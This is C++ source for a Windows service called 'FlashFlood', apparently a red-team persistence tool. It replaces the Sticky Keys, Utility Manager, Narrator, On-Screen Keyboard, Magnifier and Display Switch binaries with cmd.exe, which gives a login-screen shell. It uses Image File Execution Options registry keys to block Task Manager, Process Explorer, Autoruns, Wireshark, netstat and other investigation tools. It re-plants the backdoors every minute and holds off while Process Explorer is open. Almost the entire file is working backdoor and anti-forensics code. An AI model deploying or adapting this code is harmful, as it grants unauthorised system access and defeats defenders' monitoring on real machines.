#include <iostream>
#include <cstdlib>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <iostream>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <atomic>

#define SERVICE_NAME L"FlashFlood"

//constants
static SERVICE_STATUS ServiceStatus;
static SERVICE_STATUS_HANDLE HandleStatus;
static std::atomic<bool> g_ServiceRunning;

void ascii_art() {
    //prints FlashFlood ascii art
    std::cout << "\033[96m   ________ ___       ________  ________  ___  ___  ________ ___       ________  ________  ________\033[0m" << std::endl;
    std::cout << "\033[96m  |\\  _____\\\\  \\     |\\   __  \\|\\   ____\\|\\  \\|\\  \\|\\  _____\\\\  \\     |\\   __  \\|\\   __  \\|\\   ___ \\\033[0m" << std::endl;
    std::cout << "\033[96m  \\ \\  \\__/\\ \\  \\    \\ \\  \\|\\  \\ \\  \\___|\\ \\  \\\\\\  \\ \\  \\__/\\ \\  \\    \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\_|\\ \\\033[0m" << std::endl;
    std::cout << "\033[96m   \\ \\   __\\\\ \\  \\    \\ \\   __  \\ \\_____  \\ \\   __  \\ \\   __\\\\ \\  \\    \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\ \\\\ \\\033[0m" << std::endl;
    std::cout << "\033[96m    \\ \\  \\_| \\ \\  \\____\\ \\  \\ \\  \\|____|\\  \\ \\  \\ \\  \\ \\  \\_| \\ \\  \\____\\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\_\\\\ \\\033[0m" << std::endl;
    std::cout << "\033[96m     \\ \\__\\   \\ \\_______\\ \\__\\ \\__\\____\\_\\  \\ \\__\\ \\__\\ \\__\\   \\ \\_______\\ \\_______\\ \\_______\\ \\_______\\\033[0m" << std::endl;
    std::cout << "\033[96m      \\|__|    \\|_______|\\|__|\\|__|\\_________\\|__|\\|__|\\|__|    \\|_______|\\|_______|\\|_______|\\|_______|\033[0m" << std::endl;
    std::cout << "\033[96m                                  \\|_________|                                                          \033[0m" << std::endl;
}

void error_handling(int status, const std::string& command) {
    if (status != 0) {
        std::cout << "\033[1;31mError Running Command: \033[0m" << command << std::endl;
        exit(EXIT_FAILURE);
    }
}

void priv_esc() {
    //grants administrative permissions to sethc.exe (Sticky Keys)
    error_handling(system("takeown /f C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\sethc.exe");
    error_handling(system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Sticky Keys\033[0m" << std::endl;

    //grants administrative permissions to utilman.exe (Utility Manager)
    error_handling(system("takeown /f C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\utilman.exe");
    error_handling(system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Utility Manager\033[0m" << std::endl;

    //grants administrative permissions to narrator.exe (Narrator)
    error_handling(system("takeown /f C:\\Windows\\System32\\narrator.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\narrator.exe");
    error_handling(system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Narrator\033[0m" << std::endl;

    //grants administrative permissions to osk.exe (On Screen Keyboard)
    error_handling(system("takeown /f C:\\Windows\\System32\\osk.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\osk.exe");
    error_handling(system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for On Screen Keyboard\033[0m" << std::endl;

    //grants administrative permissions to magnify.exe (Magnifier)
    error_handling(system("takeown /f C:\\Windows\\System32\\magnify.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\magnify.exe");
    error_handling(system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Magnifier\033[0m" << std::endl;

    //grants administrative permissions to displayswitch.exe (Display)
    error_handling(system("takeown /f C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\displayswitch.exe");
    error_handling(system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");
    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Display\033[0m" << std::endl;
}

int findProcess(const wchar_t* procname) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe;
    int pid = 0;
    BOOL hResult;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    pe.dwSize = sizeof(PROCESSENTRY32W);
    hResult = Process32FirstW(hSnapshot, &pe);

    while (hResult) {
        if (wcscmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32NextW(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

void terminateProcess(const wchar_t* procname) {
    // Convert wchar_t* to std::string
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, procname, -1, NULL, 0, NULL, NULL);
    std::string procnameStr(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, procname, -1, &procnameStr[0], size_needed, NULL, NULL);

    // Find the process
    int pid = findProcess(procname);
    if (pid == 0) {
        std::cerr << "\t\033[1;33mWARNING: Process \"" << procnameStr << "\" not found.\033[0m" << std::endl;
        return;
    }

    // Terminate using Windows API (completely silent)
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "\t\033[1;31mFAILED to open process \"" << procnameStr << "\" (PID " << pid << ")\033[0m" << std::endl;
        return;
    }

    if (TerminateProcess(hProcess, 0)) {
        std::cout << "\t\033[1;32mSUCCESS: Terminated \"" << procnameStr << "\" (PID " << pid << ")\033[0m" << std::endl;
    }
    else {
        std::cerr << "\t\033[1;31mFAILED to terminate \"" << procnameStr << "\" (PID " << pid << ")\033[0m" << std::endl;
    }
    CloseHandle(hProcess);
}

void clear_screen() {
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD coord = { 0, 0 };
    DWORD count;
    CONSOLE_SCREEN_BUFFER_INFO csbi;

    GetConsoleScreenBufferInfo(hStdOut, &csbi);
    FillConsoleOutputCharacter(hStdOut, ' ', csbi.dwSize.X * csbi.dwSize.Y, coord, &count);
    SetConsoleCursorPosition(hStdOut, coord);
}

void enableAnsi() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return;

    DWORD dwMode = 0;
    if (!GetConsoleMode(hOut, &dwMode)) return;

    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
    SetConsoleMode(hOut, dwMode);
}

void cleanup() {
    //searches through system32 to find previously-run backdoors
    system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt 2> nul");
    std::vector<std::string> replacedExecutables;
    std::ifstream file("C:\\Windows\\System32\\old_files.txt");
    std::string line;

    //reads each line from the file and add to the vector
    while (std::getline(file, line)) {
        replacedExecutables.push_back(line);
    }
    file.close();

    //restores original executables by renaming old-* files back to their original names
    //also deletes previous backdoor executables
    for (const std::string& executable : replacedExecutables) {
        std::string original = executable;
        original.replace(executable.find("old-"), 4, "");
        //deletes previous backdoors
        std::string delCommand = "del " + original;
        //std::cout << delCommand << std::endl; testing
        error_handling(system(delCommand.c_str()), delCommand.c_str());
        //restores original executables
        std::string renameCommand = "move \"" + executable + "\" \"" + original + "\"";
        //std::cout << renameCommand << std::endl; testing
        error_handling(system((renameCommand + " > nul 2>&1").c_str()), renameCommand.c_str());
        std::cout << "\033[1;32m\tRemoved Previous Backdoor\033[0m" << std::endl;
    }
}

void sticky_keys() {
    //makes sure that sticky keys is turned on
    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f >nul 2>&1"),
        "reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");

    //replaces sethc.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe >nul 2>&1"), "rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
}

void utility_manager() {
    //replaces utilman.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe >nul 2>&1"), "rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
}

void narrator() {
    //replaces narrator.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe >nul 2>&1"), "rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
}

void on_screen_keyboard() {
    //replaces osk.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe >nul 2>&1"), "rename C:\\Windows\\System32\\osk.exe old-osk.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
}

void magnifier() {
    //replaces magnify.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe >nul 2>&1"), "rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
}

void display_switch() {
    //replaces displayswitch.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe >nul 2>&1"), "rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
}

void ifeo_keys() {
    //switches all important thrunting tools to execute conhost.exe
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autoruns64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\autorunsc64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Autoruns IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procexp64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Process Explorer IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\procmon64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Process Monitor IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\strings64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Strings IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\tcpview64.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded TCPView IFEO Registry Keys\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wireshark.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wireshark.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Wireshark IFEO Registry Key\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Task Manager IFEO Registry Key\033[0m" << std::endl;

    error_handling(system("reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1"),
        "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe\" /v Debugger /t REG_SZ /d \"conhost.exe\" /f >nul 2>&1");
    std::cout << "\033[1;32m\tAdded Netstat IFEO Registry Key\033[0m" << std::endl;
}

void startup() {
    clear_screen();

    //runs FlashFlood art
    ascii_art();

    //grants administrator permissions to all backdoor executables
    std::cout << "Gaining Permissions..." << std::endl;
    priv_esc();

    //enables all windows hotkeys
    error_handling(system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f >nul 2>&1"),
        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");
    std::cout << "\033[1;32m\tSuccessfully Enabled All Windows Hotkeys\033[0m" << std::endl;
}

void execute_backdoors() {
    sticky_keys();
    std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
    utility_manager();
    std::cout << "\033[1;32m\tExecuted Utility Manager Backdoor\033[0m" << std::endl;
    narrator();
    std::cout << "\033[1;32m\tExecuted Narrator Backdoor\033[0m" << std::endl;
    on_screen_keyboard();
    std::cout << "\033[1;32m\tExecuted On Screen Keyboard Backdoor\033[0m" << std::endl;
    magnifier();
    std::cout << "\033[1;32m\tExecuted Magnifier Backdoor\033[0m" << std::endl;
    display_switch();
    std::cout << "\033[1;32m\tExecuted Display Switch Backdoor\033[0m" << std::endl;
}

void terminateBackdoors() {
    //kills previous sessions
    std::vector<std::wstring> processList = {
        L"sethc.exe", L"utilman.exe", L"narrator.exe", L"osk.exe", L"magnify.exe", L"displayswitch.exe"
    };

    for (const auto& proc : processList) {
        if (findProcess(proc.c_str()) != 0) {
            terminateProcess(proc.c_str());
        }
    }
}

void WINAPI ServiceControlHandler(DWORD dwControl)
{
    switch (dwControl)
    {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(HandleStatus, &ServiceStatus);
        ServiceStatus.dwWaitHint = 60000; // 60 second timeout
        g_ServiceRunning = false;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        ServiceStatus.dwWaitHint = 3000; // 3 second timeout
        SetServiceStatus(HandleStatus, &ServiceStatus);
        g_ServiceRunning = false;
        break;
    case SERVICE_CONTROL_PAUSE:
        ServiceStatus.dwCurrentState = SERVICE_PAUSED;
        break;
    case SERVICE_CONTROL_CONTINUE:
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        ServiceStatus.dwCurrentState = SERVICE_INTERROGATE;
        break;
    default:
        break;
    }

    // Always update status unless it's STOP_PENDING
    if (ServiceStatus.dwCurrentState != SERVICE_STOP_PENDING) {
        SetServiceStatus(HandleStatus, &ServiceStatus);
    }
}

int run() {
    enableAnsi();
    startup(); //runs basic startup (clear, ascii art, admin perms, hotkeys, cleanup)
    std::cout << "Terminating Processes..." << std::endl;
    terminateBackdoors();
    std::cout << "Cleaning Up Files..." << std::endl;
    cleanup();

    bool shouldLoop = true;
    int loopDuration = 1;

    //executes selected backdoors
    std::cout << "Executing Backdoors..." << std::endl;
    execute_backdoors();

    //sets IFEO registry keys
    std::cout << "Adding IFEO Registry Keys..." << std::endl;
    ifeo_keys();

    //loops if loop parameter is present
    while (shouldLoop) {
        if (loopDuration > 0) {
            std::cout << "\033[1;33mSleeping for " << loopDuration << " minute(s) before re-running backdoors...\033[0m" << std::endl;
            std::this_thread::sleep_for(std::chrono::minutes(loopDuration));
        }
        startup();
        std::cout << "Terminating Processes..." << std::endl;
        terminateBackdoors();
        std::cout << "Cleaning Up Files..." << std::endl;
        cleanup();
        std::cout << "Executing Backdoors..." << std::endl;
        execute_backdoors();
        std::cout << "Adding IFEO Registry Keys..." << std::endl;
        ifeo_keys();
    }

    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    HandleStatus = RegisterServiceCtrlHandlerW(SERVICE_NAME, (LPHANDLER_FUNCTION)ServiceControlHandler);
    if (HandleStatus == NULL) {
        return;
    }

    //initializes service status
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = NO_ERROR;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(HandleStatus, &ServiceStatus);

    //reports running status
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(HandleStatus, &ServiceStatus);

    while (g_ServiceRunning) {
        bool isProcExpRunning = (findProcess(L"procexp.exe") != 0 || findProcess(L"procexp64.exe") != 0);

        if (!isProcExpRunning) {
            run();
            std::this_thread::sleep_for(std::chrono::minutes(1)); // Check every minute
        }
        else {
            // Wait 15 minutes max if Process Explorer is open
            for (int i = 0; i < 15 && g_ServiceRunning; i++) {
                std::this_thread::sleep_for(std::chrono::minutes(1));
                if (!(findProcess(L"procexp.exe") != 0 || findProcess(L"procexp64.exe") != 0)) {
                    break; // Exit early if closed
                }
            }
            if (g_ServiceRunning) { // Only run if service wasn't stopped during wait
                run();
            }
        }
    }

    // Stop Service
    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(HandleStatus, &ServiceStatus);
}

int main() {
    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        { (LPWSTR)SERVICE_NAME, ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcherW(ServiceTable)) {
        OutputDebugStringW(L"Failed to start service control dispatcher");
        return GetLastError();
    }
    return 0;
}